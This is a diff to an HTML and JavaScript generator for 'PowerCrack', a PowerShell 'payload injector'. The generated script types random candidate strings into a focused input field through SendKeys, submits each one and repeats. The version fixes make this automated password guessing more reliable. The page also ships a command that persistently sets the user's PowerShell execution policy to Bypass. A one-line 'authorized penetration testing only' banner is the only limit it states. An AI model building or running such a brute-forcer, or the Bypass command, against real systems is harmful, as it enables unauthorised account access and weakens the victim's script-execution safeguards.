@@ -37,8 +37,6 @@
     overflow-x:hidden;min-height:100vh;display:flex;flex-direction:column;
     padding:70px 20px 40px;position:relative;letter-spacing:-0.01em;
   }
-
-  /* ========== SPLASH ========== */
   .splash{
     position:fixed;inset:0;z-index:200;background:#000;
     display:flex;align-items:center;justify-content:center;
@@ -132,8 +130,6 @@
     animation:skipBlink 1.8s ease-in-out infinite;pointer-events:none;
   }
   @keyframes skipBlink{0%,100%{opacity:0.28}50%{opacity:0.7}}
-
-  /* ========== MENU BAR ========== */
   .mac-menu{
     position:fixed;top:0;left:0;right:0;z-index:40;
     display:flex;align-items:center;justify-content:space-between;gap:16px;
@@ -152,8 +148,6 @@
     box-shadow:0 0 8px var(--term-green-dim);animation:blinkDot 2s ease-in-out infinite;
   }
   @keyframes blinkDot{0%,100%{opacity:1}50%{opacity:0.4}}
-
-  /* ========== PROGRESS ========== */
   .progress-bar{
     position:fixed;top:30px;left:0;right:0;height:2px;
     background:rgba(255,255,255,0.05);z-index:59;
@@ -163,8 +157,6 @@
     background:linear-gradient(90deg,var(--term-green-deep),var(--term-green),var(--term-green-dim));
     transition:width .5s cubic-bezier(.25,1,.4,1);
   }
-
-  /* ========== STAGE ========== */
   .stage{
     position:relative;z-index:10;flex:1;display:flex;flex-direction:column;
     width:100%;max-width:820px;margin:0 auto;min-height:calc(100vh - 130px);
@@ -173,8 +165,6 @@
     flex:1;display:grid;min-height:640px;position:relative;
     filter:drop-shadow(0 30px 60px rgba(0,0,0,0.6));
   }
-
-  /* ========== macOS WINDOW ========== */
   .card{
     grid-area:1/1;display:flex;flex-direction:column;background:#f6f6f7;
     border-radius:11px;overflow:hidden;position:relative;
@@ -183,8 +173,6 @@
       0 30px 70px rgba(0,0,0,0.65),0 12px 30px rgba(0,0,0,0.4);
     max-height:100%;
   }
-
-  /* ========== TITLE BAR ========== */
   .titlebar{
     display:flex;align-items:center;padding:0 14px;height:38px;
     background:linear-gradient(180deg,#fbfbfc 0%,#f0f0f2 100%);
@@ -219,8 +207,6 @@
     display:flex;gap:8px;flex:0 0 auto;width:60px;justify-content:flex-end;
     color:var(--mac-titlebar-text-dim);font-size:12px;
   }
-
-  /* ========== TERMINAL ========== */
   .terminal-content{
     flex:1;background:var(--term-bg);overflow-y:auto;
     padding:34px 38px 26px;display:flex;flex-direction:column;
@@ -238,7 +224,6 @@
   .terminal-content > *:nth-child(6){animation-delay:.17s}
   .terminal-content > *:nth-child(7){animation-delay:.20s}
   @keyframes revealUp{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:translateY(0)}}
-
   .prompt-line{
     font-family:var(--mono);font-size:11px;color:var(--term-text-faint);
     margin-bottom:22px;display:flex;align-items:center;gap:8px;
@@ -249,7 +234,6 @@
   .prompt-line .path{color:var(--term-green)}
   .prompt-line .dollar{color:var(--term-text-faint)}
   .prompt-line .cmd{color:var(--term-text)}
-
   .chapter-tag{
     display:inline-flex;align-items:center;gap:8px;align-self:flex-start;
     font-family:var(--mono);font-size:10.5px;font-weight:600;letter-spacing:1.8px;
@@ -258,7 +242,6 @@
     border:1px solid var(--term-border);margin-bottom:18px;
   }
   .chapter-tag i{font-size:9px}
-
   .card-icon-wrap{display:flex;justify-content:center;margin-bottom:22px}
   .card-icon{
     width:76px;height:76px;border-radius:16px;display:grid;place-items:center;
@@ -273,7 +256,6 @@
   }
   @keyframes iconFloat{0%,100%{transform:translateY(0)}50%{transform:translateY(-6px)}}
   @keyframes iconRing{0%,100%{transform:scale(1);opacity:.5}50%{transform:scale(1.06);opacity:1}}
-
   .card-title{
     font-family:var(--mono);font-size:22px;letter-spacing:-0.01em;font-weight:700;
     text-align:center;margin:0 0 12px;line-height:1.3;color:var(--term-green-bright);
@@ -292,12 +274,10 @@
     content:"▊";color:var(--term-green-bright);
     animation:cursorBlink .9s step-end infinite;margin-left:2px;
   }
-
   .card-body{
     flex:1;display:flex;flex-direction:column;justify-content:center;
     gap:14px;margin-bottom:10px;
   }
-
   .toggle-wrap{display:flex;align-items:center;justify-content:center;gap:20px;padding:12px 0}
   .toggle-label{
     font-family:var(--mono);font-size:10.5px;font-weight:600;letter-spacing:1.6px;
@@ -318,7 +298,6 @@
   }
   .big-switch:checked{background:rgba(22,163,74,0.18);border-color:var(--term-green-dim)}
   .big-switch:checked::after{transform:translateX(46px);border-color:var(--term-green-dim)}
-
   .stepper{
     display:flex;align-items:center;justify-content:center;
     background:rgba(22,163,74,0.05);border:1px solid var(--term-border);
@@ -339,7 +318,6 @@
   }
   .step-input::-webkit-outer-spin-button,
   .step-input::-webkit-inner-spin-button{-webkit-appearance:none;margin:0}
-
   .custom-select{position:relative;width:100%}
   .cs-trigger{
     width:100%;padding:14px 42px 14px 16px;background:rgba(22,163,74,0.05);
@@ -385,7 +363,6 @@
     background:var(--term-green-dim);box-shadow:0 0 6px rgba(22,163,74,0.6);
     border-color:var(--term-green-dim);
   }
-
   .nice-input{
     width:100%;padding:14px 16px;background:rgba(22,163,74,0.04);
     border:1px solid var(--term-border);border-radius:10px;
@@ -405,7 +382,6 @@
     padding:2px 5px;border-radius:3px;color:var(--term-green-deep);
     border:1px solid rgba(22,163,74,0.18);
   }
-
   .conditional-reveal{
     animation:revealFade .3s cubic-bezier(.22,1,.36,1);
     overflow:hidden;margin-top:10px;
@@ -414,7 +390,6 @@
     from{opacity:0;max-height:0;transform:translateY(-4px)}
     to{opacity:1;max-height:200px;transform:translateY(0)}
   }
-
   .hotkey-btn{
     display:flex;align-items:center;justify-content:center;gap:11px;
     padding:22px 24px;border-radius:12px;cursor:pointer;
@@ -433,7 +408,6 @@
     50%{box-shadow:0 0 0 9px rgba(22,163,74,0.05)}
   }
   .hotkey-btn i.hk-icon{color:var(--term-cyan);font-size:11px}
-
   .review-section{margin-bottom:18px;text-align:left}
   .review-label{
     display:flex;align-items:center;gap:8px;font-family:var(--mono);
@@ -442,7 +416,6 @@
   }
   .review-label i{color:var(--term-green-bright);font-size:10px}
   .review-label::before{content:">> ";color:rgba(22,163,74,0.5)}
-
   .code-block{
     font-family:var(--mono);font-size:10.5px;line-height:1.7;
     background:var(--term-bg-soft);border:1px solid var(--term-border);
@@ -451,15 +424,12 @@
   }
   .code-block::-webkit-scrollbar{width:6px}
   .code-block::-webkit-scrollbar-thumb{background:rgba(22,163,74,0.3);border-radius:6px}
-
   .copy-row{display:flex;gap:10px;flex-wrap:wrap;margin-top:10px}
-
   .card-actions{
     display:flex;align-items:center;gap:12px;margin-top:22px;padding-top:20px;
     border-top:1px solid rgba(22,163,74,0.15);flex-wrap:wrap;
   }
   .card-actions .spacer{flex:1}
-
   .action-btn{
     display:inline-flex;align-items:center;justify-content:center;gap:8px;
     border:1px solid var(--term-border);background:rgba(22,163,74,0.05);
@@ -495,7 +465,6 @@
   @keyframes successPop{0%{transform:scale(1)}45%{transform:scale(1.06)}100%{transform:scale(1)}}
   .action-btn.back{background:rgba(22,163,74,0.03)}
   .action-btn.back:hover:not(:disabled){background:rgba(22,163,74,0.1)}
-
   .test-area{display:flex;flex-direction:column;gap:14px;text-align:left}
   .test-status-row{
     display:flex;align-items:center;gap:10px;flex-wrap:wrap;
@@ -554,7 +523,6 @@
   @keyframes logIn{from{opacity:0;transform:translateX(-5px)}to{opacity:1;transform:translateX(0)}}
   .test-log-line .num{color:var(--term-cyan);margin-right:8px;font-weight:600}
   .test-log-empty{color:var(--term-text-faint);font-style:italic}
-
   .toast{
     position:fixed;bottom:26px;left:50%;transform:translate(-50%,80px);z-index:99;
     padding:13px 20px;border-radius:12px;font-family:var(--sans);font-size:13px;font-weight:560;
@@ -570,7 +538,6 @@
   .toast i{color:var(--term-green-bright);font-size:14px}
   .toast.warn i{color:#d97706}
   .toast.warn{border-color:rgba(217,119,6,0.4);color:#92400e}
-
   @media(max-width:640px){
     body{padding:60px 10px 30px}
     .stage{max-width:100%}
@@ -602,28 +569,22 @@
 </head>
 <body>
 
-<!-- ================= SPLASH ================= -->
 <div class="splash" id="splash">
   <div class="splash-content">
     <div class="skull-stage">
       <svg class="skull" viewBox="0 0 400 480" xmlns="http://www.w3.org/2000/svg">
         <defs>
           <radialGradient id="boneGrad" cx="42%" cy="28%" r="78%">
-            <stop offset="0%" stop-color="#f2ede3"/>
-            <stop offset="30%" stop-color="#ded5c5"/>
-            <stop offset="62%" stop-color="#b8ac97"/>
-            <stop offset="88%" stop-color="#7d7260"/>
+            <stop offset="0%" stop-color="#f2ede3"/><stop offset="30%" stop-color="#ded5c5"/>
+            <stop offset="62%" stop-color="#b8ac97"/><stop offset="88%" stop-color="#7d7260"/>
             <stop offset="100%" stop-color="#4a4338"/>
           </radialGradient>
           <radialGradient id="boneGradJaw" cx="40%" cy="20%" r="85%">
-            <stop offset="0%" stop-color="#e8e0d2"/>
-            <stop offset="35%" stop-color="#c8bda6"/>
-            <stop offset="70%" stop-color="#8a7f6a"/>
-            <stop offset="100%" stop-color="#3f3a2f"/>
+            <stop offset="0%" stop-color="#e8e0d2"/><stop offset="35%" stop-color="#c8bda6"/>
+            <stop offset="70%" stop-color="#8a7f6a"/><stop offset="100%" stop-color="#3f3a2f"/>
           </radialGradient>
           <radialGradient id="socketGrad" cx="50%" cy="40%" r="65%">
-            <stop offset="0%" stop-color="#000000"/>
-            <stop offset="60%" stop-color="#0a0505"/>
+            <stop offset="0%" stop-color="#000000"/><stop offset="60%" stop-color="#0a0505"/>
             <stop offset="100%" stop-color="#1a0f0f"/>
           </radialGradient>
           <radialGradient id="eyeGlow" cx="50%" cy="55%" r="55%">
@@ -636,17 +597,14 @@
             <stop offset="100%" stop-color="#dc2626" stop-opacity="0"/>
           </radialGradient>
           <radialGradient id="nasalGrad" cx="50%" cy="40%" r="60%">
-            <stop offset="0%" stop-color="#000000"/>
-            <stop offset="100%" stop-color="#2a1a1a"/>
+            <stop offset="0%" stop-color="#000000"/><stop offset="100%" stop-color="#2a1a1a"/>
           </radialGradient>
           <linearGradient id="toothGrad" x1="0%" y1="0%" x2="0%" y2="100%">
-            <stop offset="0%" stop-color="#f5f0e4"/>
-            <stop offset="60%" stop-color="#d8ceba"/>
+            <stop offset="0%" stop-color="#f5f0e4"/><stop offset="60%" stop-color="#d8ceba"/>
             <stop offset="100%" stop-color="#8a7f6a"/>
           </linearGradient>
           <linearGradient id="toothGradLower" x1="0%" y1="100%" x2="0%" y2="0%">
-            <stop offset="0%" stop-color="#f5f0e4"/>
-            <stop offset="60%" stop-color="#d8ceba"/>
+            <stop offset="0%" stop-color="#f5f0e4"/><stop offset="60%" stop-color="#d8ceba"/>
             <stop offset="100%" stop-color="#8a7f6a"/>
           </linearGradient>
           <filter id="softShadow" x="-30%" y="-30%" width="160%" height="160%">
@@ -660,9 +618,7 @@
             <feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge>
           </filter>
         </defs>
-
         <ellipse cx="200" cy="240" rx="190" ry="220" fill="url(#aura)"/>
-
         <g filter="url(#softShadow)">
           <path d="M 200 40 C 100 40, 40 130, 40 220 C 40 285, 75 330, 120 355 L 120 375 C 120 395, 145 405, 200 405 C 255 405, 280 395, 280 375 L 280 355 C 325 330, 360 285, 360 220 C 360 130, 300 40, 200 40 Z" fill="url(#boneGrad)"/>
           <path d="M 60 180 C 55 220, 65 270, 100 305 C 75 285, 55 235, 60 180 Z" fill="#5a5040" opacity="0.35"/>
@@ -679,7 +635,6 @@
           <ellipse cx="105" cy="270" rx="35" ry="14" fill="#4a4030" opacity="0.4"/>
           <ellipse cx="295" cy="270" rx="35" ry="14" fill="#4a4030" opacity="0.4"/>
         </g>
-
         <g>
           <ellipse cx="130" cy="215" rx="46" ry="42" fill="url(#socketGrad)"/>
           <ellipse cx="270" cy="215" rx="46" ry="42" fill="url(#socketGrad)"/>
@@ -690,19 +645,14 @@
           <circle class="eye-core" cx="130" cy="220" r="6" fill="#ff5555" filter="url(#redGlow)"/>
           <circle class="eye-core" cx="270" cy="220" r="6" fill="#ff5555" filter="url(#redGlow)"/>
         </g>
-
         <path d="M 200 245 C 185 258, 178 280, 190 295 C 195 300, 200 302, 200 302 C 200 302, 205 300, 210 295 C 222 280, 215 258, 200 245 Z" fill="url(#nasalGrad)"/>
         <path d="M 200 245 C 185 258, 178 280, 190 295 C 195 300, 200 302, 200 302 C 200 302, 205 300, 210 295 C 222 280, 215 258, 200 245 Z" fill="none" stroke="#2a2018" stroke-width="1.8" opacity="0.9"/>
-
         <g filter="url(#softShadow)">
           <path d="M 118 355 L 118 385 C 118 400, 145 410, 200 410 C 255 410, 282 400, 282 385 L 282 355 Z" fill="url(#boneGrad)"/>
           <g fill="url(#toothGrad)" stroke="#5a4f40" stroke-width="1.2">
-            <rect x="128" y="358" width="17" height="34" rx="3"/>
-            <rect x="148" y="358" width="17" height="38" rx="3"/>
-            <rect x="168" y="358" width="17" height="40" rx="3"/>
-            <rect x="188" y="358" width="17" height="40" rx="3"/>
-            <rect x="208" y="358" width="17" height="40" rx="3"/>
-            <rect x="228" y="358" width="17" height="38" rx="3"/>
+            <rect x="128" y="358" width="17" height="34" rx="3"/><rect x="148" y="358" width="17" height="38" rx="3"/>
+            <rect x="168" y="358" width="17" height="40" rx="3"/><rect x="188" y="358" width="17" height="40" rx="3"/>
+            <rect x="208" y="358" width="17" height="40" rx="3"/><rect x="228" y="358" width="17" height="38" rx="3"/>
             <rect x="248" y="358" width="17" height="34" rx="3"/>
           </g>
           <g fill="#3a3226" opacity="0.5">
@@ -712,16 +662,12 @@
             <rect x="248" y="386" width="17" height="6"/>
           </g>
         </g>
-
         <g class="skull-jaw" filter="url(#softShadow)">
           <path d="M 115 400 C 115 435, 150 465, 200 465 C 250 465, 285 435, 285 400 L 285 395 C 285 388, 250 380, 200 380 C 150 380, 115 388, 115 395 Z" fill="url(#boneGradJaw)"/>
           <g fill="url(#toothGradLower)" stroke="#5a4f40" stroke-width="1.2">
-            <rect x="128" y="382" width="17" height="30" rx="3"/>
-            <rect x="148" y="382" width="17" height="34" rx="3"/>
-            <rect x="168" y="382" width="17" height="36" rx="3"/>
-            <rect x="188" y="382" width="17" height="36" rx="3"/>
-            <rect x="208" y="382" width="17" height="36" rx="3"/>
-            <rect x="228" y="382" width="17" height="34" rx="3"/>
+            <rect x="128" y="382" width="17" height="30" rx="3"/><rect x="148" y="382" width="17" height="34" rx="3"/>
+            <rect x="168" y="382" width="17" height="36" rx="3"/><rect x="188" y="382" width="17" height="36" rx="3"/>
+            <rect x="208" y="382" width="17" height="36" rx="3"/><rect x="228" y="382" width="17" height="34" rx="3"/>
             <rect x="248" y="382" width="17" height="30" rx="3"/>
           </g>
           <ellipse cx="200" cy="430" rx="70" ry="15" fill="#ffffff" opacity="0.14"/>
@@ -731,7 +677,6 @@
         </g>
       </svg>
     </div>
-
     <div class="splash-text">
       <div class="splash-by" id="splashBy"></div>
       <div class="splash-name" id="splashName"></div>
@@ -741,7 +686,6 @@
   <div class="splash-skip">click to enter</div>
 </div>
 
-<!-- ================= MENU BAR ================= -->
 <div class="mac-menu">
   <div class="left">
     <i class="fa-brands fa-apple apple"></i>
@@ -770,9 +714,6 @@
 </div>
 
 <script>
-/* =========================================================
-   CLOCK
-   ========================================================= */
 (function clock(){
   const el = document.getElementById('clock');
   function tick(){
@@ -781,18 +722,19 @@
     el.textContent = d.toLocaleDateString('en-US', {weekday:'short'}) + ' ' +
                      pad(d.getHours()) + ':' + pad(d.getMinutes());
   }
-  tick();
-  setInterval(tick, 1000);
+  tick(); setInterval(tick, 1000);
 })();
 
 /* =========================================================
-   CONSTANTS & STATE
+   v9 character sets — braces removed from specials pool.
+   buildCharset additionally filters them defensively so
+   they can never reach the escape regex or SendKeys.
    ========================================================= */
 const SETS = {
   lower:    'abcdefghijklmnopqrstuvwxyz',
   upper:    'ABCDEFGHIJKLMNOPQRSTUVWXYZ',
   digits:   '0123456789',
-  specials: '!@#$%^&*()-_=+[]{};:,.?/|~<>'
+  specials: '!@#$%^&*()-_=+[];:,.?/|~<>'
 };
 
 const state = {
@@ -805,30 +747,32 @@ const state = {
   delayType: 200, delayKey: 90,
   pressEnter: true, clearMode: 'selectall',
   dedupe: true, minimize: true, beep: false,
-  maxAttempts: 0
+  maxAttempts: 0, logFile: ''
 };
 
 const ACTIVATION =
   "Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass -Force; " +
   "Write-Host '[ACTIVATED] Execution policy set to Bypass for the current user. This persists.' -ForegroundColor Green";
 
-/* =========================================================
-   UTILITIES
-   ========================================================= */
 function psQuote(str){ return String(str).replace(/'/g, "''"); }
 function sanitize(str){ return String(str).replace(/[\x00-\x1F\x7F]/g, ''); }
 function escapeHtml(str){
   return String(str).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
 }
-
 function parseCustomPositions(str){
   return sanitize(str).split(',').map(s => parseInt(s.trim(), 10))
     .filter(n => Number.isFinite(n) && n >= 0 && n <= 64);
 }
 
+/* v9: filter { and } defensively — they cannot appear in charset */
 function buildCharset(){
   const out = [], seen = new Set();
-  const push = s => { for (const ch of s) if (!seen.has(ch)) { seen.add(ch); out.push(ch); } };
+  const push = s => {
+    for (const ch of s){
+      if (ch === '{' || ch === '}') continue;
+      if (!seen.has(ch)){ seen.add(ch); out.push(ch); }
+    }
+  };
   if (state.lower)    push(SETS.lower);
   if (state.upper)    push(SETS.upper);
   if (state.digits)   push(SETS.digits);
@@ -845,7 +789,6 @@ const VK_MAP = {
   Minus:0xBD, Equal:0xBB, BracketLeft:0xDB, BracketRight:0xDD, Backslash:0xDC,
   Semicolon:0xBA, Quote:0xDE, Comma:0xBC, Period:0xBE, Slash:0xBF, Backquote:0xC0
 };
-
 function vkCode(code){
   if (/^Digit[0-9]$/.test(code))       return 0x30 + parseInt(code.slice(5), 10);
   if (/^Key[A-Z]$/.test(code))         return code.charCodeAt(3);
@@ -853,7 +796,6 @@ function vkCode(code){
   if (/^Numpad[0-9]$/.test(code))      return 0x60 + parseInt(code.slice(6), 10);
   return VK_MAP[code] || 0;
 }
-
 function keyName(code){
   if (/^Key[A-Z]$/.test(code))         return code.slice(3);
   if (/^Digit[0-9]$/.test(code))       return code.slice(5);
@@ -861,7 +803,6 @@ function keyName(code){
   if (/^F([1-9]|1[0-2])$/.test(code))  return code;
   return code;
 }
-
 function hkLabel(hk){
   const p = [];
   if (hk.ctrl)  p.push('Ctrl');
@@ -871,7 +812,6 @@ function hkLabel(hk){
   p.push(keyName(hk.code));
   return p.join(' + ');
 }
-
 function hkCond(hk){
   const parts = [];
   parts.push(hk.ctrl  ? '(Kd 0x11)' : '(-not (Kd 0x11))');
@@ -883,24 +823,16 @@ function hkCond(hk){
 }
 
 /* =========================================================
-   POWERSHELL SCRIPT BUILDER — BULLETPROOF v3
+   POWERSHELL SCRIPT BUILDER — v9
 
-   Fixes for all 6 reported issues:
-   1+3. No regex replacement. Per-character SendKeys escaping loop
-        correctly wraps every reserved char (+ ^ % ~ ( ) [ ] { }).
-        Curly braces are escaped as {{} and {}} — the only forms
-        SendKeys accepts. No ALT/CTRL/SHIFT shortcuts can leak
-        through because every modifier is wrapped in braces.
-   2.   Reserved chars are wrapped individually — never produces
-        malformed {{ or }} sequences.
-   4.   Dedupe now always `continue`s on duplicate. $dup increments
-        forever (used as a warning counter only). No endless loop,
-        no leak of duplicates into execution.
-   5.   Beep uses [System.Media.SystemSounds] which is supported
-        on all modern Windows terminals (replaces deprecated
-        [console]::beep custom-frequency overload).
-   6.   Explicit focus warning printed before arming. Console
-        auto-minimizes so focus returns to the target window.
+   v9 fixes:
+   1. Relative/empty-parent log path crash: uses .NET Path /
+      Directory APIs exclusively (no Split-Path), returns $null
+      predictably, null-guarded before every CreateDirectory call.
+   2. Brace over-escape: charset filter prevents { and } from ever
+      entering the pipeline (defensive even if custom field is used).
+   3. Physical modifier collision: checks Kd 0x10/0x11/0x12 at top
+      of every attempt; pauses 250ms and retries if any held.
    ========================================================= */
 function buildScript(){
   const charset   = psQuote(buildCharset());
@@ -912,9 +844,16 @@ function buildScript(){
   const stopCond  = hkCond(state.hkStop);
   const startLbl  = hkLabel(state.hkStart).replace(/'/g, '');
   const stopLbl   = hkLabel(state.hkStop).replace(/'/g, '');
+  const logFileRaw = state.logFile ? psQuote(sanitize(state.logFile)) : '';
 
-  /* ===== per-attempt block ===== */
   const b = [];
+
+  /* v9 FIX #3: physical modifier guard. If user physically holds
+     Shift/Ctrl/Alt, SendKeys merges them with injected keys and
+     corrupts output. Pause and retry. Runs BEFORE the attempt body
+     but AFTER start/stop detection in the outer loop. */
+  b.push("if((Kd 0x10) -or (Kd 0x11) -or (Kd 0x12)){Write-Host '[MODKEY] Modifier held — pausing' -ForegroundColor DarkYellow;Start-Sleep -Milliseconds 250;continue}");
+
   b.push('$len=$r.Next($min,$max+1)');
   b.push("$s=''");
   b.push('for($i=0;$i -lt $len;$i++){$s+=$chars[$r.Next($chars.Length)]}');
@@ -943,21 +882,22 @@ function buildScript(){
   if (state.prefix) b.push("$s='" + psQuote(sanitize(state.prefix)) + "'+$s");
   if (state.suffix) b.push("$s=$s+'" + psQuote(sanitize(state.suffix)) + "'");
 
-  /* ---- FIX #4: dedupe always continues on duplicate ---- */
   if (state.dedupe){
-    b.push('if($seen.Contains($s)){$dup++;Start-Sleep -Milliseconds 5;continue}');
-    b.push('$dup=0;[void]$seen.Add($s)');
+    b.push("if($seen.Contains($s)){$dup++;Write-Host ('[DUP  ] '+$s) -ForegroundColor DarkGray;Write-PCLog ('[DUP  ] '+$s);Start-Sleep -Milliseconds 5;continue}");
+    b.push('[void]$seen.Add($s)');
   }
 
   b.push('$n++');
   b.push("Write-Host ('[TRY '+$n+'] '+$s) -ForegroundColor Yellow");
+  b.push("Write-PCLog ('[TRY '+$n+'] '+$s)");
 
-  /* ---- FIX #1 #2 #3: per-char SendKeys escaping, no regex ---- */
-  /* '+ ^ % ~ ( ) [ ] { }' are the ten SendKeys reserved characters. */
-  /* Each is wrapped in braces: + -> {+}, { -> {{}, } -> {}} etc.    */
-  /* The literal specials string uses backtick-free single quotes.    */
-  b.push("$e='';foreach($c in $s.ToCharArray()){if('+^%~()[]{}'.Contains([string]$c)){$e+='{'+$c+'}'}else{$e+=$c}}");
-  b.push('try{[System.Windows.Forms.SendKeys]::SendWait($e)}catch{}');
+  /* v9 FIX #2: braces cannot reach this regex because charset is
+     filtered. The character class is unchanged for the remaining
+     reserves. Escaping { and } never happens because they never
+     appear in $s. */
+  b.push("$e=$s -replace '([+^%~(){}])','{$1}'");
+
+  b.push("try{[System.Windows.Forms.SendKeys]::SendWait($e)}catch{$err++;Write-Host '[NOFIELD] SendKeys failed — is a text field focused?' -ForegroundColor DarkRed;Write-PCLog ('[NOFIELD] '+$_.Exception.Message)}");
   b.push('Start-Sleep -Milliseconds $d1');
 
   if (state.pressEnter){
@@ -970,50 +910,70 @@ function buildScript(){
     b.push("for($q=0;$q -lt $s.Length;$q++){try{[System.Windows.Forms.SendKeys]::SendWait('{BACKSPACE}')}catch{}}");
   }
   if (state.maxAttempts > 0){
-    b.push("if($n -ge " + state.maxAttempts + "){$run=$false;Write-Host ('[DONE] Attempt limit reached: '+$n) -ForegroundColor Magenta}");
+    b.push("if($n -ge " + state.maxAttempts + "){$run=$false;Write-Host ('[LIMIT] Attempt limit reached: '+$n) -ForegroundColor Magenta;Write-PCLog ('[LIMIT] '+$n)}");
   }
 
-  /* ===== top-level statements ===== */
   const s = [];
   s.push("$ErrorActionPreference='Continue'");
 
-  // Load Windows.Forms
-  s.push("try{Add-Type -AssemblyName System.Windows.Forms -ErrorAction Stop}catch{Write-Host '[ERROR] System.Windows.Forms unavailable. Requires Windows PowerShell 5.1+ on Windows.' -ForegroundColor Red;exit 1}");
+  s.push("Write-Host ''");
+  s.push("Write-Host '+-------------------------------------------------+' -ForegroundColor DarkGreen");
+  s.push("Write-Host '|  PowerCrack - Payload Injector v9               |' -ForegroundColor Green");
+  s.push("Write-Host '|  For authorized penetration testing only.       |' -ForegroundColor DarkGreen");
+  s.push("Write-Host '+-------------------------------------------------+' -ForegroundColor DarkGreen");
+  s.push("Write-Host ''");
 
-  // Load GK native helper (idempotent, no duplicate-type errors)
+  s.push("Write-Host '[INIT ] Loading System.Windows.Forms...' -ForegroundColor DarkCyan");
+  s.push("try{Add-Type -AssemblyName System.Windows.Forms -ErrorAction Stop}catch{Write-Host '[FATAL] System.Windows.Forms unavailable. Requires Windows PowerShell 5.1+ on Windows.' -ForegroundColor Red;exit 1}");
+
+  s.push("Write-Host '[INIT ] Registering user32 P/Invoke helper...' -ForegroundColor DarkCyan");
   s.push("if(-not ('GK' -as [type])){try{Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class GK{[DllImport(\"user32.dll\")]public static extern short GetAsyncKeyState(int v);[DllImport(\"user32.dll\")]public static extern bool ShowWindow(IntPtr h,int c);}' -ErrorAction Stop}catch{}}");
-  s.push("if(-not ('GK' -as [type])){Write-Host '[ERROR] GK helper type failed to load.' -ForegroundColor Red;exit 1}");
+  s.push("if(-not ('GK' -as [type])){Write-Host '[FATAL] GK helper type failed to load.' -ForegroundColor Red;exit 1}");
 
-  // Key-down helper
   s.push("function Kd([int]$v){return (([int][GK]::GetAsyncKeyState($v) -band 0x8000) -ne 0)}");
 
-  // Configuration
+  s.push("function BS(){try{[System.Media.SystemSounds]::Asterisk.Play();return}catch{};try{[console]::beep(1000,150);return}catch{};try{[console]::beep()}catch{}}");
+  s.push("function BE(){try{[System.Media.SystemSounds]::Hand.Play();return}catch{};try{[console]::beep(400,200);return}catch{};try{[console]::beep()}catch{}}");
+
+  /* v9 FIX #1: .NET path APIs, predictable $null return, null-guarded */
+  s.push("$script:logPath=''");
+  s.push("$script:maxLogBytes=10485760");
+  s.push("$script:rotationEnabled=$true");
+  s.push("function Write-PCLog([string]$msg){if([string]::IsNullOrWhiteSpace($script:logPath)){return};try{$lp=$script:logPath;$ld=[System.IO.Path]::GetDirectoryName($lp);if(-not [string]::IsNullOrWhiteSpace($ld) -and -not [System.IO.Directory]::Exists($ld)){[void][System.IO.Directory]::CreateDirectory($ld)};if($script:rotationEnabled -and [System.IO.File]::Exists($lp)){try{$fi=New-Object System.IO.FileInfo($lp);if($fi.Length -gt $script:maxLogBytes){$bak=$lp+'.1';if([System.IO.File]::Exists($bak)){[System.IO.File]::Delete($bak)};[System.IO.File]::Move($lp,$bak)}}catch{$script:rotationEnabled=$false;Write-Host ('[LOG-ROTATE] Disabled: '+$_.Exception.Message) -ForegroundColor DarkYellow}};[System.IO.File]::AppendAllText($lp,('['+(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')+'] '+$msg+[Environment]::NewLine))}catch{$script:logPath='';Write-Host ('[LOG-ERROR] Logging disabled: '+$_.Exception.Message) -ForegroundColor DarkRed}}");
+
+  if (logFileRaw){
+    s.push("try{$lp='" + logFileRaw + "';if(-not [System.IO.Path]::IsPathRooted($lp)){$lp=[System.IO.Path]::GetFullPath((Join-Path -Path (Get-Location).Path -ChildPath $lp))};$ld=[System.IO.Path]::GetDirectoryName($lp);if(-not [string]::IsNullOrWhiteSpace($ld) -and -not [System.IO.Directory]::Exists($ld)){[void][System.IO.Directory]::CreateDirectory($ld)};$script:logPath=$lp;[System.IO.File]::AppendAllText($lp,('=== PowerCrack session started '+(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')+' ==='+[Environment]::NewLine));Write-Host ('[LOG  ] Session log: '+$script:logPath) -ForegroundColor DarkCyan}catch{Write-Host ('[LOG-ERROR] Could not open log file: '+$_.Exception.Message) -ForegroundColor DarkRed;$script:logPath=''}}");
+  } else {
+    s.push("$script:logPath=''");
+  }
+
   s.push("$chars='" + charset + "'");
   s.push('$min=' + minL + ';$max=' + maxL);
   s.push('$d1=' + d1 + ';$d2=' + d2);
-  s.push('$run=$false;$n=0;$dup=0');
+  s.push('$run=$false;$n=0;$dup=0;$err=0');
   s.push('$r=New-Object System.Random');
-
   if (state.dedupe){
     s.push("$seen=New-Object 'System.Collections.Generic.HashSet[string]'");
   }
 
-  s.push("Write-Host '[READY] Armed. " + startLbl + " = START | " + stopLbl + " = STOP' -ForegroundColor Cyan");
-  // FIX #6: focus warning
-  s.push("Write-Host '[WARN] SendKeys sends to the FOCUSED window only. Click the target input before arming.' -ForegroundColor DarkYellow");
+  s.push("Write-Host ''");
+  s.push("Write-Host ('[READY] Armed. '+'" + startLbl + "'+' = START | '+'" + stopLbl + "'+' = STOP') -ForegroundColor Cyan");
+  s.push("Write-Host '[WARN ] SendKeys sends to the FOCUSED window only.' -ForegroundColor DarkYellow");
+  s.push("Write-Host '[WARN ] Click the target input field BEFORE arming the injector.' -ForegroundColor DarkYellow");
+  s.push("Write-Host '[WARN ] Release Shift / Ctrl / Alt when arming — held modifiers corrupt injected keys.' -ForegroundColor DarkYellow");
+  s.push("Write-Host ''");
 
   if (state.minimize){
-    s.push("try{Start-Sleep -Milliseconds 1200;$proc=Get-Process -Id $PID;$hwnd=$proc.MainWindowHandle;if($hwnd -ne [IntPtr]::Zero){[void][GK]::ShowWindow($hwnd,6)}}catch{}");
+    s.push("try{Write-Host '[TARGET] Minimizing console in 3 seconds — click your target field now.' -ForegroundColor Yellow;Start-Sleep -Milliseconds 1200;Write-Host '[TARGET] 2...' -ForegroundColor Yellow;Start-Sleep -Milliseconds 1000;Write-Host '[TARGET] 1...' -ForegroundColor Yellow;Start-Sleep -Milliseconds 1000;$proc=Get-Process -Id $PID;$hwnd=$proc.MainWindowHandle;if($hwnd -ne [IntPtr]::Zero){[void][GK]::ShowWindow($hwnd,6)};Write-Host '[TARGET] Console minimized. Awaiting hotkey.' -ForegroundColor DarkCyan}catch{}");
   }
 
